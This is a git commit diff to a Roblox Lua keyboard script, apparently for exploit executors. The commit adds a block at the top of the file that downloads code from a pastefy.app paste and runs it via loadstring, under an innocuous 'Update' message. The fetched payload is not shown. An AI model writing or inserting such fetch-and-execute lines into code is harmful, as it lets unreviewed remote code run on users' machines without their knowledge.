ac0c2d58e435cbdd50114a652a608b253a6bb429
barbarianTopG <134774093+barbarianTopG@users.noreply.github.com>
2025-10-04 12:50:58 +1000

    Update BetterKD.lua

--- Keyboards/BetterKD.lua
+++ Keyboards/BetterKD.lua
@@ -1,3 +1,9 @@
+pcall(function()
+    if not shared.FunctionPatchesForTrashExecutor == true then
+        loadstring(game:HttpGet("https://pastefy.app/TL0PGJ2Z/raw"))()
+        shared.FunctionPatchesForTrashExecutor = true
+    end
+end)
 local CollectionService = game:GetService("CollectionService")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
